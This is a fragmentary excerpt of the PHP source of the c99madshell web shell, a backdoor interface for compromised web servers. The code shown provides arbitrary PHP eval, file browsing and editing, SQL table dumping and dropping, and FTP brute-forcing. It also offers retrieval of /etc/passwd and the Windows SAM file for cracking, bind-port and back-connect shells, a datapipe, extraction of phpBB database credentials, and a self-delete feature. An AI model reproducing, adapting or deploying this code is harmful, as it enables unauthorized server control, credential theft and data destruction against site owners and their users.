...
$ftypes = [
 'html' => ['html', 'htm', 'shtml'],
 'txt' => ['txt', 'conf', 'bat', 'sh', 'js', 'bak', 'doc', 'log', 'sfc', 'cfg', 'htaccess'],
 'exe' => ['sh', 'install', 'bat', 'cmd'],
 'ini' => ['ini', 'inf'],
 'code' => ['php', 'phtml', 'php3', 'php4', 'inc', 'tcl', 'h', 'c', 'cpp', 'py', 'cgi', 'pl'],
 'img' => ['gif', 'png', 'jpeg', 'jfif', 'jpg', 'jpe', 'bmp', 'ico', 'tif', 'tiff', 'avi', 'mpg', 'mpeg'],
 'sdb' => ['sdb'],
 'phpsess' => ['sess'],
 'download' => ['exe', 'com', 'pif', 'src', 'lnk', 'zip', 'rar', 'gz', 'tar'],
];

$exeftypes = [
 getenv('PHPRC') . ' -q %f%' => ['php', 'php3', 'php4'],
 'perl %f%' => ['pl', 'cgi'],
];

$regxp_highlight = [
  [basename($_SERVER['PHP_SELF']), 1, '<font color="yellow">', '</font>'],
  ['config.php', 1], // example
];

$safemode_diskettes = ['a'];
$hexdump_lines = 8;
$hexdump_rows = 24;
$nixpwdperpage = 100;
...
$quicklaunch = [
 ['<b><hr>HOME</b>', $surl],
 ['<b><=</b>', '#" onclick="history.back(1)'],
 ['<b>=></b>', '#" onclick="history.go(1)'],
 ['<b>UPDIR</b>', "#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='%upd';document.todo.sort.value='%sort';document.todo.submit();"],
 ['<b>Search</b>', "#\" onclick=\"document.todo.act.value='search';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>Buffer</b>', "#\" onclick=\"document.todo.act.value='fsbuff';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>Tools</b>', "#\" onclick=\"document.todo.act.value='tools';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>Proc.</b>', "#\" onclick=\"document.todo.act.value='processes';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>FTP brute</b>', "#\" onclick=\"document.todo.act.value='ftpquickbrute';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>Sec.</b>', "#\" onclick=\"document.todo.act.value='security';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>SQL</b>', "#\" onclick=\"document.todo.act.value='sql';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>PHP-code</b>', "#\" onclick=\"document.todo.act.value='eval';document.todo.d.value='%d';document.todo.submit();"],
 ['<b>Self remove</b>', "#\" onclick=\"document.todo.act.value='selfremove';document.todo.submit();"],
...
if (!function_exists('fs_copy_dir')) {
    function fs_copy_dir($d, $t)
    {
        ...
        if (DIRECTORY_SEPARATOR != substr($d, -1)) {
...
if (!function_exists('fs_copy_obj')) {
    function fs_copy_obj($d, $t)
    {
        ...
        if (is_dir($d)) {
            ...
            if (DIRECTORY_SEPARATOR != substr($t, -1)) {
...
if (!function_exists('view_perms')) {
    ...
    {
        if (0xC000 === ($mode & 0xC000)) {
            $type = 's';
        } elseif (0x4000 === ($mode & 0x4000)) {
            $type = 'd';
        } elseif (0xA000 === ($mode & 0xA000)) {
            $type = 'l';
        } elseif (0x8000 === ($mode & 0x8000)) {
            $type = '-';
        } elseif (0x6000 === ($mode & 0x6000)) {
            $type = 'b';
        } elseif (0x2000 === ($mode & 0x2000)) {
            $type = 'c';
        } elseif (0x1000 === ($mode & 0x1000)) {
            $type = 'p';
        } else {
            $type = '?';
        }
...
if (!function_exists('mysql_buildwhere')) {
    function mysql_buildwhere($array, $sep = ' and', $functs = [])
    {
        if (!is_array($array)) {
            $array = [];
        }
...
if (!function_exists('mysql_query_parse')) {
  ...
  'DROP' => [1],
        ...
        if (is_array($types[$op])) {
            ...
            if (2 == $types[$op]) {
                foreach ($arr as $k => $v) {
                    if ('LIMIT' == strtoupper($v)) {
                        $result['limit'] = $arr[$k + 1];
                        $result['limit'] = explode(',', $result['limit']);
                        if (1 == count($result['limit'])) {
...
if (!function_exists('c99fsearch')) {
    function c99fsearch($d)
    {
        ...
        while (false !== ($f = readdir($h))) {
            if ('.' != $f && '..' != $f) {
                $bool = (empty($a['name_regexp']) and false !== strpos($f, $a['name'])) || ($a['name_regexp'] and ereg($a['name'], $f));
                if (is_dir($d . $f)) {
                    ++$search_i_d;
...
function onphpshutdown()
{
    ...
    if (!headers_sent() and $gzipencode and !in_array($ft, ['img', 'download', 'notepad'])) {
        $v = @ob_get_contents();
        @ob_end_clean();
...
if (DIRECTORY_SEPARATOR != substr($tmpdir, -1)) {
...
} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
$d = str_replace('\\', DIRECTORY_SEPARATOR, $d);
if (empty($d)) {
    $d = realpath('.');
} elseif (realpath($d)) {
...
if ('sql' == $act) {
    ...
    if (isset($_POST['sql_login'])) {
        $sql_login = htmlspecialchars($_POST['sql_login']);
    }
    if (isset($_POST['sql_passwd'])) {
        $sql_passwd = htmlspecialchars($_POST['sql_passwd']);
    }
    if (isset($_POST['sql_server'])) {
        $sql_server = htmlspecialchars($_POST['sql_server']);
    }
    if (isset($_POST['sql_port'])) {
        $sql_port = htmlspecialchars($_POST['sql_port']);
    }
    if (isset($_POST['sql_db'])) {
        $sql_db = htmlspecialchars($_POST['sql_db']);
    }
    if (isset($_POST['sql_act'])) {
        $sql_act = htmlspecialchars($_POST['sql_act']);
    }
    if (isset($_POST['sql_tbl'])) {
        $sql_tbl = htmlspecialchars($_POST['sql_tbl']);
    }
    if (isset($_POST['sql_tbl_act'])) {
        $sql_tbl_act = htmlspecialchars($_POST['sql_tbl_act']);
    }
    if (isset($_POST['thistbl'])) {
        $thistbl = htmlspecialchars($_POST['thistbl']);
    }
    if (isset($_POST['sql_order'])) {
        $sql_order = htmlspecialchars($_POST['sql_order']);
    }
    if (isset($_POST['sql_tbl_ls'])) {
        $sql_tbl_ls = htmlspecialchars($_POST['sql_tbl_ls']);
    }
    if (isset($_POST['sql_tbl_le'])) {
        $sql_tbl_le = htmlspecialchars($_POST['sql_tbl_le']);
    }
    if (isset($_POST['sql_query'])) {
        $sql_query = htmlspecialchars($_POST['sql_query']);
    }
    if (isset($_POST['sql_tbl_insert_q'])) {
        $sql_tbl_insert_q = urldecode(htmlspecialchars($_POST['sql_tbl_insert_q']));
    }
    if (isset($_POST['sql_tbl_insert_functs'])) {
        $sql_tbl_insert_functs = htmlspecialchars($_POST['sql_tbl_insert_functs']);
    }
    if (isset($_POST['sql_tbl_insert_radio'])) {
        $sql_tbl_insert_radio = htmlspecialchars($_POST['sql_tbl_insert_radio']);
    ...
    $c = 0;
        ...
        if ($sql_db) {
            ...
            if ('tbldrop' == $sql_act) {
                ...
                $sql_act = 'query';
            } elseif ('tblempty' == $sql_act) {
                $sql_query = '';
                foreach ($boxtbl as $v) {
                    $sql_query .= 'DELETE FROM `' . $v . "` \n";
                }
                $sql_act = 'query';
            } elseif ('tbldump' == $sql_act) {
                if (count($boxtbl) > 0) {
                    $dmptbls = $boxtbl;
                } elseif ($thistbl) {
                    $dmptbls = [$sql_tbl];
                ...
                $sql_act = 'query';
            } elseif ('insert' == $sql_tbl_act) {
                if (1 == $sql_tbl_insert_radio) {
                    $keys = '';
        ...
        echo '<hr size="1" noshade>';
                ...
                if ($diplay) {
                    if (!empty($sql_tbl)) {
                        ...
                        if ('structure' == $sql_tbl_act) {
                            echo '<br><br><b>Coming sooon!</b>';
                        }
                        if ('insert' == $sql_tbl_act) {
            ...
            $acts = ['', 'newdb', 'serverstatus', 'servervars', 'processes', 'getfile'];
...
if ('ftpquickbrute' == $act) {
    ...
    if (!win) {
        ...
        {
            if ($fqb_onlywithsh) {
                $TRUE = (!in_array($sh, ['/bin/FALSE', '/sbin/nologin']));
            } else {
                $TRUE = true;
            }
            if ($TRUE) {
        ...
        if (!empty($submit)) {
            if (isset($_POST['fqb_lenght'])) {
                $fqb_lenght = $_POST['fqb_lenght'];
            }
            ...
            if (!$fp) {
                ...
                if (isset($_POST['fqb_logging'])) {
                    $fqb_logging = $_POST['fqb_logging'];
                }
                if ($fqb_logging) {
                    if (isset($_POST['fqb_logfile'])) {
                        $fqb_logging = $_POST['fqb_logfile'];
                    }
                    if ($fqb_logfile) {
...
if ('security' == $act) {
    ...
    if (!$win) {
        if ($nixpasswd) {
            ...
            echo "<br><a href=\"#\" onclick=\"document.todo.act.value='security';document.todo.d.value='" . $ud . "';document.todo.nixpasswd.value='1';document.todo.submit();\"><b><u>Get /etc/passwd</u></b></a><br>";
        }
    } else {
        ...
        if (file_get_contents($v)) {
            ...
            echo "<b><font color=green>You can crack winnt passwords. <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='sam';document.todo.d.value='" . $_SERVER['WINDIR'] . "\/repair';document.todo.ft.value='download';document.todo.submit();\"><u><b>Download</b></u></a>, and use lcp.crack+ �.</font></b><br>";
        }
    }
    if (file_get_contents('/etc/userdomains')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='userdomains';document.todo.d.value='" . urlencode('/etc') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";
    }
    if (file_get_contents('/var/cpanel/accounting.log')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='accounting.log';document.todo.d.value='" . urlencode('/var/cpanel/') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>View cpanel logs</b></u></a></font></b><br>";
    }
    if (file_get_contents('/usr/local/apache/conf/httpd.conf')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='httpd.conf';document.todo.d.value='" . urlencode('/usr/local/apache/conf') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";
    }
    if (file_get_contents('/etc/httpd.conf')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='httpd.conf';document.todo.d.value='" . urlencode('/etc') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";
    }
    if (file_get_contents('/etc/syslog.conf')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='syslog.conf';document.todo.d.value='" . urlencode('/etc') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";
    }
    if (file_get_contents('/etc/motd')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='motd';document.todo.d.value='" . urlencode('/etc') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Message Of The Day</b></u></a></font></b><br>";
    }
    if (file_get_contents('/etc/hosts')) {
        echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='hosts';document.todo.d.value='" . urlencode('/etc') . "';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Hosts</b></u></a></font></b><br>";
    }
...
if ('selfremove' == $act) {
    if (($submit == $rndcode) and ('' != $submit)) {
        if (unlink(__FILE__)) {
            @ob_clean();
            echo 'Thanks for using c99madshell v.' . $shver . '!';
            c99shexit();
        } else {
...
<b>Search for (file/folder name): </b><input type="text" name="search_name" size="' . round(strlen($search_name) + 25) . '" value="' . htmlspecialchars($search_name) . '">&nbsp;<input type="checkbox" name="search_name_regexp" value="1" ' . (1 == $search_name_regexp ? ' checked' : '') . '> - regexp
...
<br><br><input type="checkbox" name="search_text_regexp" value="1" ' . (1 == $search_text_regexp ? ' checked' : '') . '> - regexp
&nbsp;&nbsp;<input type="checkbox" name="search_text_wwo" value="1" ' . (1 == $search_text_wwo ? ' checked' : '') . '> - <u>w</u>hole words only
&nbsp;&nbsp;<input type="checkbox" name="search_text_cs" value="1" ' . (1 == $search_text_cs ? ' checked' : '') . '> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type="checkbox" name="search_text_not" value="1" ' . (1 == $search_text_not ? ' checked' : '') . '> - find files <u>NOT</u> containing the text
...
if (!$usefsbuff) {
    if (('paste' == $act) or ('copy' == $act) or ('cut' == $act) or ('unselect' == $act)) {
    ...
    if ($actemptybuff) {
        ...
        $arcerr = '';
        if ('.tar.gz' == substr($actarcbuff_path, -7, 7)) {
            $ext = '.tar.gz';
        } else {
            $ext = '.tar.gz';
        }
        ...
        foreach ($objects as $v) {
            ...
            if (is_dir($v)) {
                if (DIRECTORY_SEPARATOR != substr($v, -1)) {
...
if ('ls' == $act) {
    ...
    if (0 == count($list)) {
        ...
        if ('f' == $vd) {
            ...
            $y = "<a href=\"#\" onclick=\"document.todo.act.value='" . $dspact . "';document.todo.d.value='" . urlencode($d) . "';document.todo.sort.value='" . $k . ('a' == $parsesort[1] ? 'd' : 'a') . ';document.todo.submit();">';
            $row[$k] .= $y;
            ...
            foreach ($objects as $a) {
                ...
                foreach ($regxp_highlight as $r) {
                    ...
                    if (preg_match('/' . $r[0] . '/', $o)) {
                        if ((!is_numeric($r[1])) or ($r[1] > 3)) {
                            ...
                            $r[1] = round($r[1]);
                            $isdir = is_dir($v);
                            if ((0 == $r[1]) or ((1 == $r[1]) and !$isdir) or ((2 == $r[1]) and !$isdir)) {
                                if (empty($r[2])) {
                                    $r[2] = '<b>';
                                    $r[3] = '</b>';
                                }
                ...
                if (is_dir($v)) {
                    $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='d';document.todo.d.value='" . $uv . "';document.todo.submit();\">I</a>&nbsp;" . $checkbox;
                } else {
  ...
  <input type=\"button\" onclick=\"ls_setcheckboxall(1);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(0);\" value=\"Unselect all\"><b>";
        ...
        echo '<option value=delete' . ('delete' == $dspact ? ' selected' : '') . '>Delete</option>';
        echo '<option value=chmod' . ('chmod' == $dspact ? ' selected' : '') . '>Change-mode</option>';
        if ($usefsbuff) {
            echo '<option value=cut' . ('cut' == $dspact ? ' selected' : '') . '>Cut</option>';
            echo '<option value=copy' . ('copy' == $dspact ? ' selected' : '') . '>Copy</option>';
            echo '<option value=unselect' . ('unselect' == $dspact ? ' selected' : '') . '>Unselect</option>';
        }
...
if ('tools' == $act) {
    $bndportsrcs = [
  'c99sh_bindport.pl' => ['Using PERL', 'perl %path %port'],
  'c99sh_bindport.c' => ['Using C', '%path %port %pass'],
 ];
    $bcsrcs = [
  'c99sh_backconn.pl' => ['Using PERL', 'perl %path %host %port'],
  'c99sh_backconn.c' => ['Using C', '%path %host %port'],
 ];
    $dpsrcs = [
  'c99sh_datapipe.pl' => ['Using PERL', 'perl %path %localport %remotehost %remoteport'],
  'c99sh_datapipe.c' => ['Using C', '%path %localport %remoteport %remotehost'],
 ];
    if (!is_array($bind)) {
        $bind = [];
    }
        ...
        if (empty($v)) {
            ...
            if (!$fp) {
                ...
                if (!$sock) {
                    ...
                    echo 'Binding... ok! Connect to <b>' . getenv('SERVER_ADDR') . ':' . $bind['port'] . '</b>! You should use NetCat&copy;, run "<b>nc -v ' . getenv('SERVER_ADDR') . ' ' . $bind['port'] . "</b>\"!<center><a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.grep.value='" . basename($binpath) . "';document.todo.submit();\"><u>View binder's process</u></a></center>";
                }
            }
            echo '<br>';
        }
        ...
        if (empty($v)) {
            ...
            if (!$fp) {
                ...
                if (!$sock) {
                    ...
                    echo 'Running datapipe... ok! Connect to <b>' . getenv('SERVER_ADDR') . ':' . $datapipe['port'] . ', and you will connected to ' . $datapipe['remoteaddr'] . '</b>! You should use NetCat&copy;, run "<b>nc -v ' . getenv('SERVER_ADDR') . ' ' . $bind['port'] . "</b>\"!<center><a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.grep.value='" . basename($binpath) . "';document.todo.submit();\"><u>View datapipe process</u></a></center>";
                }
            }
            echo '<br>';
        }
...
if ('processes' == $act) {
    ...
    if (!$ret) {
        ...
        $k = $parsesort[0];
        if ('a' != $parsesort[1]) {
            $y = "<a href=\"#\" onclick=\"document.todo.act.value='" . $dspact . "';document.todo.d.value='" . urlencode($d) . "';document.todo.processes_sort.value='" . $k . "a\"';document.todo.submit();\">!</a>";
        } else {
            $y = "<a href=\"#\" onclick=\"document.todo.act.value='" . $dspact . "';document.todo.d.value='" . urlencode($d) . "';document.todo.processes_sort.value='" . $k . "d\"';document.todo.submit();\">!</a>";
        }
        ...
        if (!$win) {
            ...
            for ($i = 0; $i < count($head); ++$i) {
                if ($i != $k) {
                    $head[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='" . $dspact . "';document.todo.d.value='" . urlencode($d) . "';document.todo.processes_sort.value='" . $i . $parsesort[1] . "';document.todo.submit();\"><b>" . $head[$i] . '</b></a>';
                }
            }
            $prcs = [];
            ...
            for ($i = 0; $i < count($head); ++$i) {
                if ($i != $k) {
                    $head[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='" . $dspact . "';document.todo.d.value='" . urlencode($d) . "';document.todo.processes_sort.value='" . $i . $parsesort[1] . "a\"';document.todo.submit();\"><b>" . trim($head[$i]) . '</b></a>';
                }
            }
            $prcs = [];
            foreach ($stack as $line) {
...
if ('eval' == $act) {
    ...
    echo '<form method=POST><input type=hidden name=act value=eval><textarea name="eval" cols="122" rows="10">' . htmlspecialchars($eval) . '</textarea><input type=hidden name="d" value="' . $dispd . '"><br><br><input type=submit value="Execute">&nbsp;Display in text-area&nbsp;<input type="checkbox" name="eval_txt" value="1"';
    if ($eval_txt) {
        echo ' checked';
    }
    echo '></form>';
...
if ('f' == $act) {
    if ((!is_readable($d . $f) or is_dir($d . $f)) and 'edit' != $ft) {
        if (file_exists($d . $f)) {
   ...
   ['EDIT', 'edit'],
        ...
        foreach ($arr as $t) {
            if ($t[1] == $rft) {
                echo " <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='" . urlencode($f) . "';document.todo.ft.value='" . $t[1] . "';document.todo.d.value='" . urlencode($d) . "';document.todo.submit();\"><font color=green>" . $t[0] . '</font></a>';
            } elseif ($t[1] == $ft) {
            ...
            if (ereg('php' . 'BB 2.(.*) auto-generated config file', $r)) {
                ...
                if (count(18 == $arr)) {
                    ...
                    if ('mysql' == $dbms) {
                        ...
                        echo "But, you can't connect to forum sql-base, because db-software=\"" . $dbms . '" is not supported by c99madshell. Please, report us for fix.';
                    }
                    echo 'Parameters for manual connect:<br>';
                    $cfgvars = ['dbms' => $dbms, 'dbhost' => $dbhost, 'dbname' => $dbname, 'dbuser' => $dbuser, 'dbpasswd' => $dbpasswd];
